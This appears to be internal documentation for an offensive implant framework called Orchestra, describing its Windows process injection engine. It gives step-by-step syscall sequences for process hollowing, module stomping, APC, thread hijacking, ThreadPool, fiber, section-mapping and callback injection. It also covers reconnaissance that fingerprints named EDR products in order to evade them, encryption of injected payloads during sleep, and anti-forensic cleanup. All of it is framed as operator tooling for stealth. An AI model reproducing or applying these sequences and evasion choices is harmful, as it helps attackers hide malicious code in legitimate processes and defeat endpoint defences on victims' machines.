# Injection Engine — Deep Dive

Complete reference for Orchestra's process injection engine: all techniques, pre-injection reconnaissance, decision flowchart, memory layouts, syscall sequences, handle management, cleanup, and sleep enrollment.

---

## Overview

The injection engine (`agent/src/injection/` — Windows, gated by `#[cfg(target_os = "windows")]`) provides multiple techniques for injecting code into remote processes. It automatically selects the best technique based on target process reconnaissance.

### Techniques Summary

| Technique | Stealth | Reliability | Complexity | Best For |
|-----------|---------|-------------|------------|----------|
| **Process Hollowing** | High | High | Medium | Long-lived payloads |
| **Module Stomping** | Very High | High | High | Blending with loaded modules |
| **Early Bird APC** | Medium | High | Low | Suspended/new processes |
| **Thread Hijacking** | Very High | Medium | High | Avoiding new thread creation |
| **ThreadPool Injection** (8 variants) | Very High | Medium | High | Avoiding thread creation entirely |
| **Fiber Injection** | Very High | Medium | High | Legitimate execution context |
| **Context-Only Injection** | Very High | Medium | Low | Quick RIP redirect, no shellcode |
| **Section Mapping Injection** | Very High | High | Medium | Dual-mapped shared sections |
| **Callback Injection** (12 APIs) | Very High | Medium | Medium | Legitimate API callback dispatch |

---

## Pre-Injection Reconnaissance

Before any injection, the engine performs reconnaissance on the target process:

### Process Assessment

```rust
pub struct ProcessRecon {
    pub pid: u32,
    pub name: String,
    pub is_protected: bool,     // Protected Process Light
    pub is_elevated: bool,      // Running as SYSTEM/Admin
    pub arch: Arch,             // x86 or x64
    pub module_count: usize,
    pub has_edr_modules: bool,  // Known EDR DLLs detected
    pub edr_names: Vec<String>, // Names of detected EDR modules
    pub thread_count: usize,
    pub session_id: u32,
    pub integrity_level: IntegrityLevel,
}

pub enum Arch { X86, X64 }

pub enum IntegrityLevel {
    Low,
    Medium,
    High,
    System,
}
```

### Reconnaissance Checks

1. **Architecture match** — Injection only works if source and target are the same architecture
2. **Protection level** — Protected Process Light (PPL) processes cannot be injected
3. **EDR detection** — Checks for known EDR DLLs (CrowdStrike, SentinelOne, Carbon Black, Defender ATP, etc.)
4. **Integrity level** — Cannot inject into higher-integrity processes without privilege escalation
5. **Session ID** — Cross-session injection requires additional token manipulation

### Module Enumeration

```rust
fn enumerate_modules(process_handle: HANDLE) -> Vec<ModuleInfo> {
    // Uses NtQueryVirtualMemory + NtReadVirtualMemory
    // Walks PEB → LDR_DATA_TABLE_ENTRY → InMemoryOrderModuleList
    // Extracts: base address, size, name, timestamp
}
```

### EDR Detection Heuristics

Known EDR module name patterns (checked case-insensitively):

| EDR | Module Pattern |
|-----|----------------|
| CrowdStrike Falcon | `CS*.dll`, `CSPM.dll` |
| SentinelOne | `S1*.dll`, `Sentinel*.dll` |
| Carbon Black | `CB*.dll`, `RepMgr*.dll` |
| Microsoft Defender ATP | `MpCmdRun*`, `MsSense*` |
| Cortex XDR | `Cyver*`, `xdr*.dll` |
| CrowdStrike | `CSFalcon*.dll` |
| FireEye | `xagt*.dll` |

---

## Technique Decision Flowchart

```
                    ┌─────────────────┐
                    │ Target Process  │
                    │ Recon           │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ Protected?      │──── Yes ──► Fail (cannot inject)
                    └────────┬────────┘
                             │ No
                    ┌────────▼────────┐
                    │ EDR Detected?   │──── Yes ──► Prefer stealthy:
                    └────────┬────────┘             ThreadPool or Fiber
                             │ No
                    ┌────────▼────────┐
                    │ Suspended       │──── Yes ──► Early Bird APC
                    │ process?        │             or Process Hollow
                    └────────┬────────┘
                             │ No
                    ┌────────▼────────┐
                    │ Need persistent │──── Yes ──► Module Stomping
                    │ presence?       │             (blends with modules)
                    └────────┬────────┘
                             │ No
                    ┌────────▼────────┐
                    │ Default         │──────────► Thread Hijacking
                    │                 │            or Process Hollow
                    └─────────────────┘
```

---

## Technique Details

### 1. Process Hollowing (`hollowing` crate)

Replaces the main module of a legitimate process with the payload:

#### Memory Layout

```
Before hollowing:
┌──────────────────────┐ 0x00400000
│ legitimate.exe       │
│ ┌──────┐             │
│ │ .text│ (original)  │
│ ├──────┤             │
│ │ .rdata│            │
│ ├──────┤             │
│ │ .data │            │
│ └──────┘             │
└──────────────────────┘

After hollowing:
┌──────────────────────┐ 0x00400000
│ hollowed process     │
│ ┌──────┐             │
│ │ .text│ (payload)   │
│ ├──────┤             │
│ │ .rdata│ (payload)  │
│ ├──────┤             │
│ │ .data │ (payload)  │
│ └──────┘             │
└──────────────────────┘
```

#### Syscall Sequence

```
1. CreateProcessW(szTargetPath, CREATE_SUSPENDED)
   → process_handle, thread_handle

2. NtQueryVirtualMemory(process_handle, ImageBase)
   → base_address of main module

3. NtReadVirtualMemory(process_handle, base_address)
   → Read original PE headers (for entry point extraction)

4. NtUnmapViewOfSection(process_handle, base_address)
   → Unmap original executable from memory

5. NtAllocateVirtualMemory(process_handle, base_address, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
   → Allocate memory at same base address

6. NtWriteVirtualMemory(process_handle, base_address, payload_headers)
   → Write PE headers

7. NtWriteVirtualMemory(process_handle, section_va, section_data)
   → Write each PE section

8. NtProtectVirtualMemory(process_handle, section_va, original_protection)
   → Restore original section protections (RW→RX for .text, RW for .data)

9. NtWriteVirtualMemory(process_handle, image_base_offset, &base_address)
   → Update PEB ImageBaseAddress to new base

10. SetThreadContext(thread_handle, {RIP: new_entry_point})
    → Redirect execution to payload entry point

11. NtResumeThread(thread_handle)
    → Resume execution (payload runs inside legitimate process)
```

#### Handle Cleanup

```rust
fn cleanup(process_handle: HANDLE, thread_handle: HANDLE) {
    // Close handles only, do not terminate the process
    NtClose(thread_handle);
    NtClose(process_handle);
}
```

---

### 2. Module Stomping (Module Overloading)

Loads a legitimate DLL, then overwrites its memory with the payload. The payload appears as a legitimate loaded module in the process's module list.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, path_buf, MEM_COMMIT, PAGE_READWRITE)
   → Allocate buffer for DLL path

3. NtWriteVirtualMemory(process_handle, path_buf, legitimate_dll_path)
   → Write DLL path (e.g., "C:\Windows\System32\amsi.dll")

4. CreateRemoteThread(process_handle, LoadLibraryW, path_buf)
   → Load legitimate DLL in target

5. WaitForSingleObject(remote_thread, INFINITE)
   → Wait for DLL to load

6. NtQueryVirtualMemory(process_handle, ModuleBase)
   → Find loaded module base address

7. NtProtectVirtualMemory(process_handle, module_base, PAGE_READWRITE)
   → Make module memory writable

8. NtWriteVirtualMemory(process_handle, module_base, payload)
   → Overwrite module with payload

9. NtProtectVirtualMemory(process_handle, module_base, PAGE_EXECUTE_READ)
   → Set to executable

10. CreateRemoteThread(process_handle, payload_entry, NULL)
    → Execute payload
```

#### Advantages

- Payload appears as a legitimate module (e.g., `amsi.dll`)
- Module is in the PEB's module list
- No unexplained memory regions
- **Very effective against memory scanners** that compare loaded modules against disk

---

### 3. Early Bird APC Injection

Queues an APC to a thread in a newly created (suspended) process. The APC executes before the process's main thread starts.

#### Syscall Sequence

```
1. CreateProcessW(target_path, CREATE_SUSPENDED)
   → process_handle, thread_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. QueueUserAPC((PAPCFUNC)alloc_base, thread_handle, 0)
   → Queue APC to main thread

6. NtResumeThread(thread_handle)
   → Thread resumes, APC fires before main()
```

#### Advantages

- Very fast — no need to wait for process initialization
- APC fires in the context of the process's primary thread
- No additional thread creation

---

### 4. Thread Hijacking

Hijacks an existing thread in the target process by modifying its context (register state) to redirect execution.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, target_pid)
   → snapshot_handle

6. Thread32First/Next → Find suitable thread (not the current thread)
   → thread_id

7. OpenThread(THREAD_ALL_ACCESS, FALSE, thread_id)
   → thread_handle

8. SuspendThread(thread_handle)
   → Suspend target thread

9. GetThreadContext(thread_handle, &context)
   → Save original context

10. context.Rip = alloc_base
    → Set instruction pointer to payload

11. SetThreadContext(thread_handle, &context)
    → Apply modified context

12. ResumeThread(thread_handle)
    → Thread resumes at payload address
```

#### Advantages

- No new thread creation — EDR products often monitor `NtCreateThreadEx`
- Execution happens in the context of a legitimate thread
- The hijacked thread's call stack appears legitimate

---

### 5. ThreadPool Injection

Injects shellcode by queuing work items to the target process's thread pool. No new thread creation, no remote thread creation — the process's own thread pool threads execute the payload.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, target_pid)
   → Find a thread pool thread (heuristic: waits on TpAllocWork-related objects)

6. QueueUserAPC((PAPCFUNC)alloc_base, thread_handle, 0)
   → Queue to thread pool thread

   OR

7. NtWriteVirtualMemory(process_handle, callback_addr, &alloc_base)
   → Write function pointer to callback slot

8. TpPostWork(work_item)
   → Post work item to trigger execution
```

#### Advantages

- **Highest stealth** — no `NtCreateThreadEx`, no `CreateRemoteThread`
- Execution happens in legitimate thread pool worker threads
- Very difficult for EDR to distinguish from normal thread pool activity

---

### 6. Fiber Injection

Converts a thread to a fiber, creates a new fiber with the payload, and switches to it. Fibers are user-mode scheduled and don't trigger kernel thread creation alerts.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtAllocateVirtualMemory(process_handle, NULL, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → alloc_base

3. NtWriteVirtualMemory(process_handle, alloc_base, shellcode)
   → Write payload

4. NtProtectVirtualMemory(process_handle, alloc_base, PAGE_EXECUTE_READ)
   → Make executable

5. CreateRemoteThread(process_handle, fiber_payload, NULL)
   → Create thread that:

   a. ConvertThreadToFiber(NULL)
      → fiber_context

   b. CreateFiber(0, (LPFIBER_START_ROUTINE)alloc_base, NULL)
      → payload_fiber

   c. SwitchToFiber(payload_fiber)
      → Execute payload as fiber
```

#### Advantages

- Fiber execution is invisible to most EDR thread monitoring
- No kernel thread creation — all user-mode scheduling
- Legitimate use case (Windows uses fibers for SQL Server, etc.)

---

### 7. ThreadPool Injection — Extended Variants

The ThreadPool injection technique has been expanded to **8 sub-variants**, each
using a different thread pool work-dispatch mechanism. This variety allows the
operator to select the variant least likely to be monitored by a given EDR product.

| Variant | Dispatch API | Callback Signature | Notes |
|---------|-------------|-------------------|-------|
| `TpAllocWork` | `TppAllocWork` | `PTP_WORK_CALLBACK` | Classic work item |
| `TpAllocWorkEx` | Extended alloc | `PTP_WORK_CALLBACK` | Extended parameters |
| `TpPostWork` | `TppPostWork` | — | Post existing work |
| `TpAllocJob` | `TppAllocJob` | `PTP_JOB_CALLBACK` | Job-based execution |
| `TpAllocAlpcCompletion` | `TppAllocAlpcCompletion` | ALPC handler | ALPC port-based |
| `TpAllocIoCompletion` | `TppAllocIoCompletion` | IO completion | I/O completion port |
| `TpAllocTimer` | `TppAllocTimer` | `PTP_TIMER_CALLBACK` | Timer-triggered |
| `TpAllocWait` | `TppAllocWait` | `PTP_WAIT_CALLBACK` | Wait-triggered |

#### Selection Logic

The engine automatically selects the variant based on target process reconnaissance:

1. If the target already has an I/O completion port → use `TpAllocIoCompletion`
2. If the target has ALPC ports → use `TpAllocAlpcCompletion`
3. If the target has timer objects → use `TpAllocTimer`
4. Default: `TpAllocWork` (most common, least suspicious)

---

### 8. Context-Only Injection

Performs a minimal thread-context hijack without injecting any shellcode.
The attacker-supplied function address is written directly into the RIP
register of a suspended thread. No memory allocation, no write, no protection
change — only a `CONTEXT` structure modification.

#### Syscall Sequence

```
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
   → process_handle

2. NtGetContextThread(thread_handle, &context)
   → Save original context

3. context.Rip = payload_address  (already in process memory)
   → Redirect execution

4. NtSetContextThread(thread_handle, &context)
   → Apply modified context

5. NtResumeThread(thread_handle, NULL)
   → Thread resumes at payload_address
```

#### Advantages

- Zero memory allocation — nothing suspicious in virtual memory
- Zero memory writes — no `NtWriteVirtualMemory` calls
- Only a single `NtSetContextThread` syscall (plus `NtGetContextThread`)
- Best OPSEC when payload already exists in target (e.g., module stomping already done)

---

### 9. Section Mapping Injection

Creates a shared section object (via `NtCreateSection`), maps it into both the
agent and the target process, and writes the payload via the local mapping.
The target process accesses it via the remote mapping. This avoids
`NtWriteVirtualMemory` entirely.

#### Syscall Sequence

```
1. NtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL,
      &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)
   → Create shared section

2. NtMapViewOfSection(section_handle, NtCurrentProcess(), &local_base, ...)
   → Map into agent (RW)

3. memcpy(local_base, shellcode, shellcode_len)
   → Write payload locally

4. NtMapViewOfSection(section_handle, target_process, &remote_base, ...)
   → Map into target (RX)

5. NtClose(section_handle)
   → Clean up section handle

6. CreateRemoteThread(target_process, remote_base, NULL)
   → Execute in target
```

#### Advantages

- No `NtWriteVirtualMemory` — EDR commonly hooks this
- Section objects are used legitimately for shared memory IPC
- The section can be mapped with different permissions in each process
- `NtMapViewOfSection` from `\KnownDlls` is a common legitimate pattern

---

### 10. Callback Injection (12 APIs)

Abuses legitimate Windows API functions that accept function-pointer callbacks.
The payload address is supplied as the callback; when the API invokes it, the
payload executes in the context of the calling thread.

| # | API | Trigger | Callback Param |
|---|-----|---------|---------------|
| 1 | `EnumChildWindows` | Window enumeration | `WNDENUMPROC` |
| 2 | `EnumSystemLocalesA` | Locale enumeration | `LOCALE_ENUMPROC` |
| 3 | `EnumSystemLocalesW` | Locale enumeration (wide) | `LOCALE_ENUMPROC` |
| 4 | `EnumDesktopWindows` | Desktop window enumeration | `WNDENUMPROC` |
| 5 | `EnumFontsA` | Font enumeration | `FONTENUMPROCA` |
| 6 | `EnumFontsW` | Font enumeration (wide) | `FONTENUMPROCW` |
| 7 | `EnumDisplayMonitors` | Display enumeration | `MONITORENUMPROC` |
| 8 | `EnumResourceTypesA` | Resource type enumeration | `ENUMRESTYPEPROC` |
| 9 | `EnumResourceTypesW` | Resource type enumeration (wide) | `ENUMRESTYPEPROC` |
| 10 | `CreateTimerQueueTimer` | Timer expiry | `WAITORTIMERCALLBACK` |
| 11 | `EnumClipboardFormats` | Clipboard format enumeration | `CLIPBOARDENUMPROC` |
| 12 | `EnumThreadWindows` | Thread window enumeration | `WNDENUMPROC` |

#### Selection Logic

1. If a desktop/window exists in the target → prefer window-based callbacks (1, 4, 12)
2. If GUI resources are available → prefer `EnumDisplayMonitors`, `EnumFonts`
3. If no GUI → use `EnumSystemLocales`, `EnumResourceTypes`, `EnumClipboardFormats`
4. For delayed execution → use `CreateTimerQueueTimer`

#### Advantages

- All 12 APIs are legitimate Windows functions with callback parameters
- EDR must hook all 12 APIs to detect this technique (computationally expensive)
- Callbacks execute in the caller's thread — no remote thread creation
- Extremely difficult to distinguish from legitimate enumeration calls

---

## InjectionViability Assessment

The engine classifies each target process with a viability rating:

```rust
pub enum InjectionViability {
    /// Injection is safe and likely to succeed
    Viable,
    /// Injection may work but with caveats (e.g., EDR present but bypassable)
    Possible(String),
    /// Injection is not recommended (e.g., system process, protected)
    NotRecommended(String),
    /// Injection will fail (e.g., architecture mismatch, protected process)
    NotPossible(String),
}
```

### Assessment Criteria

| Factor | Viable | Possible | Not Recommended | Not Possible |
|--------|--------|----------|-----------------|--------------|
| Architecture | Match | — | Mismatch | — |
| Protection | None | — | — | PPL/PPL-PS |
| Integrity | ≤ Target | — | System process | — |
| EDR | None | Bypassable | Heavy hooks | — |
| Session | Same | — | Different session | — |
| Process State | Active | Suspended | — | Zombie |

---

## Sleep Enrollment (Remote Sleep Obfuscation)

After injection, the agent can enroll the injected payload in the sleep obfuscation cycle. This means the payload's memory is encrypted during sleep periods, just like the agent's own memory.

### Enrollment Process

```
1. Agent allocates memory in target process for payload
2. Agent calls MemoryGuard::register_remote(region, process_handle)
3. During each sleep cycle:
   a. Agent encrypts its own memory regions
   b. Agent uses NtWriteVirtualMemory to encrypt remote payload memory
   c. Agent sleeps (NtDelayExecution)
   d. Agent decrypts its own memory
   e. Agent uses NtWriteVirtualMemory to decrypt remote payload memory
4. Remote payload wakes up with decrypted memory
```

### Key Management for Remote Regions

- Remote regions use the same XChaCha20-Poly1305 key as the agent
- The key is transmitted to the remote payload via a shared memory region or encrypted control channel
- The remote payload stores the key in XMM14/XMM15 (same as the agent)

---

## Handle Management

All handles are carefully managed to avoid leaking:

```rust
struct HandleGuard {
    handle: HANDLE,
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE_VALUE && self.handle != null_mut() {
            unsafe { NtClose(self.handle); }
        }
    }
}
```

- **RAII wrappers** ensure handles are closed even on error paths
- **NtClose** is used (not CloseHandle) to avoid user-mode hooks
- **Double-close protection** — handles are set to `null_mut()` after closing

---

## Cleanup and Anti-Forensics

After successful injection:

1. **Zero allocation buffers** — Shellcode staging buffers are zeroed with `SecureZeroMemory`
2. **Close all handles** — Process, thread, and snapshot handles
3. **Free temporary allocations** — NtFreeVirtualMemory for staging areas
4. **Restore original protections** — Any temporarily modified memory pages
5. **No persistent handles** — The injected code has no open handles from the injector

---

## Error Handling

The injection engine uses detailed error types:

```rust
pub enum InjectionError {
    OpenProcessFailed(String),
    AllocationFailed(String),
    WriteFailed(String),
    ProtectionChangeFailed(String),
    ThreadCreationFailed(String),
    ThreadHijackFailed(String),
    ModuleNotFound(String),
    ArchitectureMismatch,
    ProtectedProcess,
    ElevatedPrivilegesRequired,
    RemoteError(String),
}
```

Each error includes a human-readable description and the failing NTSTATUS code where applicable.

---

## Feature Flags

| Feature | Effect |
|---------|--------|
| `default` | Process Hollowing + Early Bird APC |
| `module-stomp` | Enables Module Stomping technique |
| `thread-hijack` | Enables Thread Hijacking technique |
| `threadpool-inject` | Enables ThreadPool injection technique (8 variants) |
| `fiber-inject` | Enables Fiber injection technique |
| `context-only` | Enables Context-Only injection technique |
| `section-map` | Enables Section Mapping injection technique |
| `callback-inject` | Enables Callback injection technique (12 APIs) |
| `direct-syscalls` | All techniques use direct syscalls via `nt_syscall` crate |

---

## Cross-Platform Notes

The injection engine is Windows-only. On Linux, a limited injection capability exists via `memfd_create` and `process_vm_writev`:

1. Create anonymous file with `memfd_create`
2. Write payload to the memfd
3. Use `process_vm_writev` to inject shellcode
4. Create remote thread via `clone` syscall

This is significantly more limited than the Windows injection engine and is primarily used for P2P agent migration.

---

## See Also

- [ARCHITECTURE.md](ARCHITECTURE.md) — Agent internals and module initialization
- [SLEEP_OBFUSCATION.md](SLEEP_OBFUSCATION.md) — Sleep obfuscation and memory encryption
- [SECURITY.md](SECURITY.md) — OPSEC considerations for injection
